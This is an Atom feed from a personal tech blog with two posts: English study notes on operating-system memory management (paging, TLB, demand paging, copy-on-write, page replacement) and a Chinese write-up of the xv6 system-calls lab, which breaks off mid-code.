<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Tech_Islet</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2025-05-19T13:35:52.814Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>蘋末风</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Operating System Concepts: Memory Management</title>
    <link href="http://example.com/2025/05/19/Operating-System-Concepts-Ch8&amp;Ch9/"/>
    <id>http://example.com/2025/05/19/Operating-System-Concepts-Ch8&amp;Ch9/</id>
    <published>2025-05-19T13:32:29.399Z</published>
    <updated>2025-05-19T13:35:52.814Z</updated>
    
    <content type="html"><![CDATA[<p>In the foregoing chapters we actually discussed about <strong>CPU sharing</strong> among processes. If we want to execute a process, it should be first loading into memory, so the memory will be shared by other processes simultaneously to allow multiprogramming. In chapter 8 and chapter 9, we will focus on <strong>memory sharing</strong>.</p><h1 id="memory-management-algorithms"><a class="markdownIt-Anchor" href="#memory-management-algorithms"></a> Memory-management Algorithms</h1><h2 id="contiguous-memory-allocation"><a class="markdownIt-Anchor" href="#contiguous-memory-allocation"></a> Contiguous Memory Allocation</h2><p>In <strong>contiguous memory allocation</strong>, each process (OS process or user process) is contained in a single section of memory that is contiguous to the section containing the next process.</p><h3 id="problem-1-protection"><a class="markdownIt-Anchor" href="#problem-1-protection"></a> Problem 1 : Protection</h3><blockquote><p>How to protect the memory address space from accessing by others?</p></blockquote><p>Since the process is contiguous in memory, which means we can use two registers for each process to limit their address accessing: <strong>limit register</strong> and <strong>relocation register</strong>. When CPU shceduler selects a process for execution, the dispatcher loads the relocation and limit registers as part of context switch, then MMU will maps the logical address dynamically by adding the two values to specific physical address.</p><p><img src="/2025/05/19/Operating-System-Concepts-Ch8&Ch9/contiguous.png" alt="contiguous.png"></p><h3 id="problem-2-allocation"><a class="markdownIt-Anchor" href="#problem-2-allocation"></a> Problem 2 : Allocation</h3><blockquote><p>How to share memory among processes?</p></blockquote><p>One simple methods, <strong>mutiple-partition</strong>: dividing memory into several fixed-sized partitions, and each partition may cotain exactly one process. This method will cause a bunch of memory waste, typically in <strong>internal fragmentation</strong>.</p><p>In the <strong>variable-partition shceme</strong>, the operating system may keep a table indicating which parts of memory are available and which are occupied. In general, the memory blocks available comprise a set of <strong>holes</strong> of various size scattered throughout memory. When a process is to swapped into memory, OS will find an free block that is large enough. If the hole is too large, it is split into two parts, one is allocated to the arriving process; the other is returned to the set of holes, these adjacent holes are merged to form one larger hole.</p><hr><p>As processes are loaded and removed from memory, the free memory space is broken into little, which are called <strong>external fragmentation</strong>. It exists then there is enough total memory space to satisfy a request but the available spaces are not contiguous!</p><p>One solution to the external-fragmentation problem is to permit the logical address space of the processes to be <strong>noncontiguous</strong>. Two complementary techniques achieve this solution: segmentation and paging.</p><h2 id="segmentation"><a class="markdownIt-Anchor" href="#segmentation"></a> Segmentation</h2><p>Hardware can provide a memory mechanism that mapped the programmer’s view to the actual physical memory, which system would have more freedom to manage memory, while the programmer would have a more natural programming environment (<strong>uncoupling</strong>).</p><p>In sementation shceme, a logical address space is a collection of segments, each has a name and a length. The programmer specifies each address by two quantities: a segment name and an offset, as <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>&lt;</mo><mi>s</mi><mi>e</mi><mi>g</mi><mi>m</mi><mi>e</mi><mi>n</mi><mi>t</mi><mo>−</mo><mi>n</mi><mi>u</mi><mi>m</mi><mi>b</mi><mi>e</mi><mi>r</mi><mo separator="true">,</mo><mi>o</mi><mi>f</mi><mi>f</mi><mi>s</mi><mi>e</mi><mi>t</mi><mo>&gt;</mo></mrow><annotation encoding="application/x-tex">&lt;segment-number,offset&gt;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.80952em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">n</span><span class="mord mathdefault">u</span><span class="mord mathdefault">m</span><span class="mord mathdefault">b</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span></span></span></span>.</p><p>In order to map the two-dimentional logical address to one-dimentional physical address, we use a datastructure called <strong>segment table</strong>. Each entry of segment table has a segment base and a segment limit (similar to conitiguous allocation). The use of a segment table is illustrated below, where <code>s</code> stands for a segment number and <code>d</code> referred to a s the offset from base address of the segment.</p><p><img src="/2025/05/19/Operating-System-Concepts-Ch8&Ch9/segmentation.png" alt="segmentation.png"></p><h2 id="paging"><a class="markdownIt-Anchor" href="#paging"></a> Paging</h2><p>Paging is another memory-management scheme that permits the physical adress space of a process to be noncontiguous.</p><p>The basic method for implementing paging involves breaking physical memory into fixed-sized blocks caclled <strong>frames</strong> and breaking logical memory into blocks of the same size called <strong>pages</strong>. In this way, paging avoids external fragmentation and the need for compaction.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">command</span> <span class="keyword">for</span> querying page size <span class="keyword">in</span> Linux</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">getconf PAGESIZE</span></span><br><span class="line">4096</span><br></pre></td></tr></table></figure><p><img src="/2025/05/19/Operating-System-Concepts-Ch8&Ch9/paging.png" alt="paging.png"><br>Every address generated by CPU is divided into two parts: a <strong>page number §</strong> and a <strong>page offset (d)</strong>. The page number is used as an index into a <strong>page table</strong>. The page table contains the base address of each frame in physical memory, which maps logical page to phsical frame. Below is the paging model:<br><img src="/2025/05/19/Operating-System-Concepts-Ch8&Ch9/paging-model.png" alt="paging-model.png"><br>Notice that frames are allocated as uints, so we would always allocated more memory to process than it needs, which results in internal fragmentation.</p><h3 id="hardware-support-tlb"><a class="markdownIt-Anchor" href="#hardware-support-tlb"></a> Hardware Support - TLB</h3><p>Some operating system allocate a page table for each process, so a pointer to the page table is stored with the other register values in PCB (e.g., xv6 <code>kernel/proc.h</code>). Other operating systems provide one or at most a few page tables, which decreases the overhead involbed when process are context-switched.</p><p>Page table can be implemented as a set of <strong>dedicated registers</strong>. If we want to access location <em>i</em>, we must first index into the page table, then using the frame number in table entry to access the desired place. <strong>With this shceme, two memory accesses are needed</strong>.</p><p>In pratice, we use a special, small, fast-lookup hardware cache called a <strong>translation look-aside buffer (TLB)</strong>. The TLB is associative, high-speed memory. It stores recently used page table entries, which are used for address translation. When the CPU needs to access a memory location, it first checks the TLB. If the required address translation is found in the TLB (a TLB hit), the access can be completed very quickly, usually in a few clock cycles. If the page number is not in the TLB (a TLB miss), a memory reference to the page table must be made, then we obtain the fram number from memory , and in addition, add the page number and frame numer to the TLB.<br><img src="/2025/05/19/Operating-System-Concepts-Ch8&Ch9/tlb.png" alt="tlb.png"></p><h1 id="virtual-memory"><a class="markdownIt-Anchor" href="#virtual-memory"></a> Virtual Memory</h1><p>Segmentation and paging are fundamental memory-management strategies that bridge the gap between the programmer’s view of a continuous memory space and the reality of physical memory. From a programmer’s perspective, memory appears as a seamless, contiguous expanse. However, in the physical realm, memory is divided into blocks scattered across various locations.</p><p>Segmentation divides the program into logical segments such as the code segment, data segment, and stack segment. <strong>Each segment is a continuous block of virtual memory</strong>, which is then mapped to different parts of the physical memory. Paging, on the other hand, partitions both virtual and physical memory into fixed-size pages. These pages are used to establish a mapping relationship between the virtual and physical memory spaces.</p><p><strong><em>Virtual memory</em> builds upon these segmentation and paging mechanisms.</strong> It extends the concept by enabling a mapping between physical memory pages and blocks in the back storage, typically a hard disk. When a process needs more memory than is currently available in physical memory, the operating system can swap out less-used pages from the physical memory to the back storage and bring in the required pages. This process creates an illusion for each process, allowing it to operate as if it has access to a larger memory space than the actual physical memory.</p><h2 id="mechanism"><a class="markdownIt-Anchor" href="#mechanism"></a> Mechanism</h2><h3 id="1-demand-paging"><a class="markdownIt-Anchor" href="#1-demand-paging"></a> 1. Demand Paging</h3><p>When a executable program is to be loaded to RAM, we can load the entire one in physical memory at execution time, but the fact is that we may not initially <em>need</em> the entire program in memory. <strong>We can just load pages only as they are needed</strong>. This technique is known as <strong>demand paging</strong>.</p><p>First we need some form of hardware support to tell whether the pages are in memory or on the disk. That is <strong>valid-invalid bit</strong>:</p><ul><li>valid bit: The associated page is both legal (belongs to that process) and in memory.</li><li>invalid bit: The page is either not valid or is currently on the disk.<br><img src="/2025/05/19/Operating-System-Concepts-Ch8&Ch9/valid-invalid.png" alt="valid-invalid.png"><br>If access to a page marked invalid, it will cause a <strong>page fault</strong>, then making a <em>trap</em> (<code>syscall</code>) to the operating system. The procedudre for handling the page fault is straightforward:</li></ul><ol><li>Check an internal table to determine whether the access is valid.</li><li>Invalid, terminate the process; Valid but page not in memory, now page it in.</li><li>Find a free frame (frame allocation).</li><li>Schedule a disk operation to read that page into frame.</li><li>Disk read completes, modify internal table and update page table (set valid bit).</li><li>Restart the instruction that was interrupted by the trap.<br><img src="/2025/05/19/Operating-System-Concepts-Ch8&Ch9/page-fault.png" alt="page-fault.png"></li></ol><h3 id="2-copy-on-write"><a class="markdownIt-Anchor" href="#2-copy-on-write"></a> 2. Copy-on-Write</h3><p>With demand paging, we can easily start a process with <code>fork()</code> by just loading the page that contains the first instruction. In fact, <code>fork()</code> works by creating a copy of parent’s address space for child. Child process and parent process are in their own virtual (logical) address space, but actually they share the same pages, which is called copy-on-write pages. When child edit the variable in its address space or invoke the <code>exec()</code> syscall, the operating system will then copy the edited page for child, left others pages shared. This technique is known as <strong>copy-on-write</strong>.</p><p><strong>Copy-on-Write (COW)</strong> is an optimization technique in virtual memory management where <strong>multiple processes share the same physical memory pages</strong> until one process tries to <strong>modify</strong> the shared page. At that point, a <strong>private copy</strong> of the page is made for the writing process, allowing safe modification without affecting others.</p><ul><li>When <strong>either process tries to write</strong> to a shared page:<ol><li>A <strong>page fault</strong> occurs.</li><li>The operating system:<ul><li>Allocates a <strong>new physical page</strong>.</li><li>Copies the contents of the original page to the new page.</li><li>Updates the <strong>page table</strong> of the writing process to point to the new (private) page with <strong>write access</strong>.</li></ul></li><li>Now each process has <strong>its own copy</strong> of that page.</li></ol></li></ul><h2 id="page-replacement"><a class="markdownIt-Anchor" href="#page-replacement"></a> Page Replacement</h2><p>When there is enough free frames in memory, we will not get trouble in physical frame allocation in page swapping. But what about there is <strong>no free frame</strong> on free-frame list? Then we may swap out a process and free all its frames, it works well in some circumstances (in thrashing below). Here we introduce a common solution - <strong>page replacement</strong>.</p><p>Page replacement together with frame allocation are the two fundamental techniques to implement demand paging:</p><ul><li><strong>Frame-allocation alogorithm</strong>: Decide how many frames to allocate to each process.</li><li><strong>Page-repalcement alogorithm</strong>: Decide which page will be swapped out into disk.</li></ul><p>In page replacement, we generally aim to <strong>swap out the page that is least likely to be used soon</strong> to minimize page faults.</p><h3 id="1-fifo-page-replacement"><a class="markdownIt-Anchor" href="#1-fifo-page-replacement"></a> 1. FIFO Page Replacement</h3><p>The <strong>FIFO (First-In, First-Out)</strong> page replacement algorithm replaces the <strong>oldest</strong> page in memory — the one that was loaded <strong>first</strong>.</p><p>It uses a <strong>simple queue</strong>:</p><ul><li>When a new page needs to be loaded and memory is full, the page at the <strong>front of the queue</strong> is removed.</li><li>The new page is added to the <strong>back</strong>.</li></ul><p><strong>Drawback:</strong> It may remove frequently used pages just because they’ve been in memory the longest — leading to <strong>more page faults</strong> (this is known as <strong>Belady’s anomaly</strong>).</p><h3 id="2-lru-page-replacement"><a class="markdownIt-Anchor" href="#2-lru-page-replacement"></a> 2. LRU Page Replacement</h3><p><strong>LRU (Least Recently Used)</strong> replaces the page that <strong>has not been used for the longest time</strong>. The idea is based on the assumption that pages used recently will likely be used again soon.</p><p><strong>Implement Methods：</strong></p><ol><li>Using a <strong>counter or timestamp</strong> (software simulation), every time a page is accessed, record a timestamp. When a replacement is needed, select the page with the <strong>oldest timestamp</strong>.<ul><li>Pros: Easy to implement logically.</li><li>Cons: Costly in time and space to maintain timestamps.</li></ul></li><li>Using a <strong>stack</strong> (linked list or array) to store the page. On every access:<ul><li>Remove the page from its current position.</li><li>Move it to the <strong>top/front</strong> (most recently used).</li></ul></li><li>Using <strong>hash map + doubly linked list</strong> (efficient LRU cache).<ul><li><strong>Hash Map</strong>: Maps page numbers to nodes in the list.</li><li><strong>Doubly Linked List</strong>: Keeps pages in order of usage — head is most recently used, tail is least.</li></ul></li></ol><h3 id="3-second-chance-page-replacement"><a class="markdownIt-Anchor" href="#3-second-chance-page-replacement"></a> 3. Second-chance Page Replacement</h3><p>The <strong>Second-Chance algorithm</strong> is a page replacement strategy that improves on FIFO by giving pages a “second chance” before being replaced. One way to implement this strategy is using circular queue.<br>Each page has a <strong>reference bit</strong>:</p><ul><li>When a page is accessed, its bit is set to <strong>1</strong>.</li><li>When a page is selected for replacement:<ul><li>If its reference bit is <strong>0</strong>, it’s replaced.</li><li>If the bit is <strong>1</strong>, it’s cleared and the page and find the next page with rerference bit <strong>0</strong> (giving it a second chance).</li></ul></li></ul><p>This way, frequently used pages are less likely to be swapped out.</p><hr><p><strong>Reference:</strong></p><ul><li><em>Operating System Concepts, 9th edition</em></li><li>ChatGPT 4o</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;In the foregoing chapters we actually discussed about &lt;strong&gt;CPU sharing&lt;/strong&gt; among processes. If we want to execute a process, it s</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>6.s081 Lab: System Calls</title>
    <link href="http://example.com/2025/05/15/Lab-System%20Calls/"/>
    <id>http://example.com/2025/05/15/Lab-System%20Calls/</id>
    <published>2025-05-15T12:36:40.671Z</published>
    <updated>2025-05-19T12:16:51.821Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Before you start coding, read Chapter 2 of the <a href="https://pdos.csail.mit.edu/6.828/2023/xv6/book-riscv-rev1.pdf">xv6 book</a>, and Sections 4.3 and 4.4 of Chapter 4, and related source files.</p></blockquote><h1 id="using-gdb"><a class="markdownIt-Anchor" href="#using-gdb"></a> Using GDB</h1><p>这一小节主要是通过故意修改<code>syscall.c</code>中的 syscall 编号为 <code>*(int*)0</code>发生 kernel panic，以此学习 GDB 的基础用法。查看 kernel 虚拟内存映射关系可以知道 0x00 这个位置根本没有映射到物理内存的页，因此读取这个内存虚拟地址的数据会发生<strong>缺页（page fault）</strong>。<br><img src="/2025/05/15/Lab-System%20Calls/trapframe.png" alt="trapframe.png"></p><p>寄存器<code>a3</code>保存 num 变量的值，在 0x80002052 （kernel code）如我们所愿地通过 <code>0(zero)</code>变址寻址到 0x00，发生 page fault。关于缺页错误处理我没有继续 trace 下去，这个任务留到之后的实验中（traps）。<br><img src="/2025/05/15/Lab-System%20Calls/fault.png" alt="fault.png"><br><img src="/2025/05/15/Lab-System%20Calls/layout.png" alt="layout.png"></p><h1 id="system-call-tracing"><a class="markdownIt-Anchor" href="#system-call-tracing"></a> System call tracing</h1><blockquote><p>In this assignment you will add a system call tracing feature that may help you when debugging later labs. You’ll create a new <code>trace</code> system call that will control tracing. It should take one argument, an integer “mask”, whose bits specify which system calls to trace. You have to modify the xv6 kernel to print out a line when each system call is about to return, if the system call’s number is set in the mask. The line should contain the process id, the name of the system call and the return value; you don’t need to print the system call arguments. The <code>trace</code> system call should enable tracing for the process that calls it and any children that it subsequently forks, but should not affect other processes.</p></blockquote><p>这个任务需要我们添加一个<code>trace</code>系统调用，通过传入需要跟踪的系统调用编号，<code>trace</code>将会打印出进程对该 syscall 的调用记录。</p><hr><blockquote><p>ps: 为了更好实现这个 syscall ，我们应该对整个系统调用的过程有清晰的认识，即理解用户态系统调用如何跳转到内核 syscall 实现的。这个过程涉及用户态代码、硬件陷阱机制和内核态代码的协同工作，但 trap 在后面的实验才会涉及到，所以在这个任务中我们暂时将中间的一些过程进行抽象，其中的细节过程留到后面的 lab 来学习。</p></blockquote><p><strong>syscall 调用过程如下（以 <code>trace</code> 为例）：</strong></p><ol><li><p>用户态按照<code>user/user.h</code>中提供的系统调用接口<code>int trace(int)</code>调用 <code>trace(1 &lt;&lt; SYS_read)</code>。这个系统调用相当于注册需要跟踪的 syscall。</p></li><li><p><code>trace()</code>调用 <code>user/usys.S</code> 中对应的汇编 stub。那么什么是 <em>stub</em> ？Just show me the code！通过下面的汇编我们可以知道符号重定向时会把这段代码 copy 过去，它的任务很简单，即把系统调用编号 <code>SYS_trace</code> 写入 <code>a7</code> 寄存器，然后 <code>ecall</code> 将控制权转移给 kernel 。</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.global trace</span><br><span class="line">trace:</span><br><span class="line"> li a7, SYS_trace</span><br><span class="line"> ecall</span><br><span class="line"> ret</span><br></pre></td></tr></table></figure><ol start="3"><li><code>ecall</code> 指令触发硬件处理逻辑，然后内核处理 trap ，其中过程暂时忽略，最后会调用 <code>syscall()</code> 这个统一的系统调用接口。</li><li><code>syscall()</code> 根据系统调用编号在 <code>syscalls</code> 数组中查找 handler (<code>sys_trace</code>)并调用。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/syscall.c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">syscall</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">  <span class="type">int</span> num;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  num = p-&gt;trapframe-&gt;a7;  <span class="comment">// Get the syscall number</span></span><br><span class="line">  <span class="keyword">if</span>(num &gt; <span class="number">0</span> &amp;&amp; num &lt; NELEM(syscalls) &amp;&amp; syscalls[num]) &#123;</span><br><span class="line">    p-&gt;trapframe-&gt;a0 = syscalls[num]();</span><br><span class="line"></span><br><span class="line"><span class="comment">// SOMETHING ELSE</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="title function_">uint64</span> <span class="params">(*syscalls[])</span><span class="params">(<span class="type">void</span>)</span> = &#123;</span><br><span class="line">[SYS_fork]   = sys_fork,</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">[SYS_trace]  = sys_trace,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="4"><li><code>sys_trace</code>即是 kernel 对于这个系统调用的真正实现，文件里的<code>sys_</code>函数是用户程序通过 <code>ecall</code> 的最终调用目标。在 <code>sys_</code> 函数中，我们才开始解析 syscall 传递的参数，然后实现具体逻辑。参数解析需要通过<code>kernel/syscall.c</code>提供的<code>argint</code>、<code>argaddr</code>和<code>argfd</code>完成，特殊地还需要使用 <code>fetchstr</code> 和 <code>fetchaddr</code> 来完成（这一部分涉及虚拟地址转换，留在下一个 Lab 分析）。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/sysproc.c</span></span><br><span class="line">uint64 <span class="title function_">sys_trace</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">  <span class="type">int</span> mask;</span><br><span class="line"></span><br><span class="line">  argint(<span class="number">0</span>, &amp;mask);</span><br><span class="line">  myproc()-&gt;mask = mask;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li><code>sys_</code>函数执行后返回给<code>syscall()</code>，继续一路返回到用户态，用户程序从 <code>ecall</code> 指令之后的那条指令继续执行。</li></ol><hr><p>大概理解<code>trace</code>作为一个用户态系统调用的调用过程后，我们来考虑实现逻辑。</p><p>首先我们需要修改 <code>struct proc</code>（<code>kernel/proc.c</code>），为每个进程添加一个 mask 字段来记录需要跟踪的系统调用。（其实我感觉 mask 作为 process 的一个状态挺奇怪的，但是我也不知道应该怎么设计比较合理，因此按照 Lab 的提示来进行。）</p><p>为了打印出调用指定系统调用的进程信息，我们需要修改<code>syscall()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">syscall</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">  <span class="type">int</span> num;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  num = p-&gt;trapframe-&gt;a7;</span><br><span class="line">  <span class="keyword">if</span>(num &gt; <span class="number">0</span> &amp;&amp; num &lt; NELEM(syscalls) &amp;&amp; syscalls[num]) &#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Tracing the system call if required</span></span><br><span class="line">    <span class="keyword">if</span>((p-&gt;mask &amp; (<span class="number">1</span> &lt;&lt; num)) != <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d: syscall %s -&gt; %d\n&quot;</span>, p-&gt;pid, syscalls_name[num], p-&gt;trapframe-&gt;a0);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们为每个进程添加了一个 <code>mask</code> 字段，因此还需要修改 <code>fork</code> 系统调用，将 mask 传递给子进程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/proc.c</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">fork</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">  <span class="type">int</span> i, pid;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">np</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// copy tracing mask from parent to child</span></span><br><span class="line">  np-&gt;mask = p-&gt;mask;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">return</span> pid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>测试结果如下：<br><img src="/2025/05/15/Lab-System%20Calls/trace.png" alt="trace.png"></p><h1 id="sysinfo"><a class="markdownIt-Anchor" href="#sysinfo"></a> Sysinfo</h1><blockquote><p>In this assignment you will add a system call, <code>sysinfo</code>, that collects information about the running system. The system call takes one argument: a pointer to a <code>struct sysinfo</code> (see <code>kernel/sysinfo.h</code>). The kernel should fill out the fields of this struct: the <code>freemem</code> field should be set to <strong>the number of bytes of free memory</strong>, and the <code>nproc</code> field should be set to <strong>the number of processes whose state is not UNUSED</strong>.</p></blockquote><p>任务要求我们将内核空间中的信息（<code>freemem</code>和<code>nproc</code>）复制到用户空间中的 <code>sysinfo</code> 中，这需要我们使用 <code>copyout()</code> 实现一些 built-in 的内核函数，再利用这些内核函数来实现具体的<code>sys_sysinfo()</code>。对于 <code>copyout</code> 的实现我们还是先不深入分析，以<code>sys_fstat()</code> (<code>kernel/sysfile.c</code>) 和  <code>filestat()</code> (<code>kernel/file.c</code>) 为例来使用它。</p><p>实现 <code>sysinfo</code> 需要填充两个字段信息：空余可用的内存大小 <code>freemem</code> 和状态不是 <code>UNUSED</code> 的进程数量 <code>nproc</code>。</p><h2 id="freemem"><a class="markdownIt-Anchor" href="#freemem"></a> freemem</h2><p>要扫描空余内存大小，我们需要知道 xv6 是如何模拟 RAM 的（巨大数组？）。然而实际上 xv6 并没有模拟 RAM，这个工作由 QEMU 来进行，它模拟了 RAM 这个<strong>硬件</strong>，让运行在 QEMU 之上的 xv6 操作系统感觉自己是在与硬件交互。比如 xv6 尝试访问物理内存地址 <code>0x80200000</code>，QEMU 会截取这个指令并<strong>翻译</strong>地址为实际本机的一个物理地址。</p><p>xv6 允许分配的物理内存地址范围为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/memlayout.h</span></span><br><span class="line"><span class="comment">// the kernel expects there to be RAM</span></span><br><span class="line"><span class="comment">// for use by the kernel and user pages</span></span><br><span class="line"><span class="comment">// from physical address 0x80000000 to PHYSTOP.</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERNBASE 0x80000000L</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PHYSTOP (KERNBASE + 128*1024*1024)</span></span><br></pre></td></tr></table></figure><p><code>kernel/kalloc.c</code> 实现了很多访问物理内存的接口，其中定义了一个 <code>kmem</code> 链表用来保存空闲物理页。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">run</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">freelist</span>;</span></span><br><span class="line">&#125; kmem;</span><br></pre></td></tr></table></figure><p>那么我们填充 <code>freemem</code> 字段的 helper function 的逻辑就很清晰了，直接遍历这个页表即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/kalloc.c</span></span><br><span class="line">uint64 <span class="title function_">kfreemem</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span>*  <span class="title">r</span>;</span></span><br><span class="line">  uint64 freemem = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  acquire(&amp;kmem.lock);</span><br><span class="line">  r = kmem.freelist;</span><br><span class="line">  <span class="keyword">while</span>(r)&#123;</span><br><span class="line">    freemem += PGSIZE;</span><br><span class="line">    r = r-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">  release(&amp;kmem.lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> freemem;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="nproc"><a class="markdownIt-Anchor" href="#nproc"></a> nproc</h2><p><code>kernel/proc.c</code> 中定义了数组 <code>struct proc proc[NPROC]</code> 用来管理所有进程。 <code>NPROC</code> 是最大的进程数量，我们直接遍历计算非 <code>UNUSED</code> 的进程数量即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 